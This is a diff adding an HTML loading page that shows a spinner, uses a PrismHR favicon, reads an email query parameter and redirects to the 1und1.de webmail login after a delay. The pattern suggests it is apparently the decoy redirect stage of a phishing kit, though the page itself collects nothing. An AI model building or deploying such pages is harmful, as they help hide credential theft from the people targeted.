@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <link rel="icon" href="https://ess.prismhr.com/ess/auth/favicon.ico" type="image/x-icon">
+    <style>
+        /* Basic styling for the loading page */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Verdana', sans-serif; /* Match font with index.html */
+            background-color: #f4f4f4; /* Match background color with index.html */
+        }
+        .loading-container {
+            text-align: center;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #ffffff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Add shadow for consistency */
+        }
+        .spinner {
+            border: 4px solid #f3f3f3; /* Light grey */
+            border-top: 4px solid #4CAF50; /* Green, matching index.html */
+            border-radius: 50%;
+            width: 60px; /* Consistent size with other UI elements */
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            margin-top: 20px;
+            color: #333;
+            font-family: Arial;
+            font-size: 16px; /* Increased font size */
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="spinner"></div>
+        <p>Please wait while we complete your request...</p>
+    </div>
+    <script>
+        // Function to get the query parameter by name
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Get the email from the query parameter
+        const email = getQueryParam('email');
+
+        // Redirect to https://kunden.1und1.de/login/webmail after 2 seconds
+        setTimeout(() => {
+            window.location.href = 'https://kunden.1und1.de/login/webmail';
+        }, 3500); // Adjusted delay to 3 seconds
+    </script>
+</body>
+</html>
